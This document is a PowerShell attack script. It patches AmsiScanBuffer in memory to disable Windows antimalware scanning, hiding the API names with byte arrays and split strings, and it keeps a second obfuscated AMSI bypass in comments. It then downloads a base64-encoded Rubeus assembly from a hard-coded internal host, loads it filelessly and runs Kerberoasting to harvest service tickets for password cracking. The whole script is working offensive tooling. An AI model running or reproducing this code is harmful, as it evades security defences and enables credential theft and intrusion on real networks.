Add-Type -AssemblyName System.Windows.Forms
$m = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
$gM = $m.GetMethod('GetModuleHandle')
$gA = $m.GetMethod('GetProcAddress')

function Get-Func {
    Param([string]$module, [string]$function)
    $gA.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $gM.Invoke($null, @($module)))), $function))
}

function Get-Del {
    Param([IntPtr]$fA, [Type[]]$aT, [Type]$rT = [Void])
    $t = [AppDomain]::('Curren' + 'tDomain').DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('QM', $false).DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $t.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $aT).SetImplementationFlags('Runtime, Managed')
    $t.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $rT, $aT).SetImplementationFlags('Runtime, Managed')
    [System.Runtime.InteropServices.Marshal]::('GetDelegate' +'ForFunctionPointer')($fA, $t.CreateType())
}

$amsiAddr = Get-Func ([System.Text.Encoding]::ASCII.GetString([Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c))) ([System.Text.Encoding]::ASCII.GetString([Byte[]](0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)))
$vp = Get-Func 'kernel32.dll' ('Virt' + 'ualProtec' + 't')
$vt = Get-Del $vp @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())
$dummy = 0
$vt.Invoke($amsiAddr, 5, 0x40, [ref]$dummy)
[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3), 0, $amsiAddr, 16)

try {
    #try {
    #    [Ref].Assembly.GetType(('S'+'y'+'ste'+("{0}{1}{2}" -f 'm.M','an','ag')+("{1}{0}"-f'nt','eme')+'.'+("{0}{1}"-f'A','utoma')+("{1}{2}{0}" -f'i','t','ion.AmsiUt')+'ls')).GetField((("{0}{1}"-f 'amsi','I')+'n'+("{1}{0}" -f 'e','itFail')+'d'),(("{0}{1}" -f'NonP','ubl')+'i'+("{1}{0}"-f ',St','c')+'a'+'tic')).SetValue(${nU`lL},${Tr`Ue})
    #    Write-Host "AMSI bypass applied successfully." -ForegroundColor Green
    #} catch {
    #    Write-Warning "Failed to apply AMSI bypass. This script may be blocked by AMSI."
    #}
    
    #Start-Sleep -Milliseconds 5000
    $url = "http://10.0.0.7:9090/Rubeus.b64"
    $base64Assembly = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
    if ($base64Assembly -is [byte[]]) { $base64Assembly = [Text.Encoding]::UTF8.GetString($base64Assembly) }
    [Reflection.Assembly]::Load([Convert]::FromBase64String($base64Assembly)) | Out-Null
    [Rubeus.Program]::Main(@("kerberoast", "/stats"))
} catch {
    Write-Error "Error: $($_.Exception.Message)"
    if ($_.Exception.InnerException) { Write-Error "Inner Exception: $($_.Exception.InnerException.Message)" }
}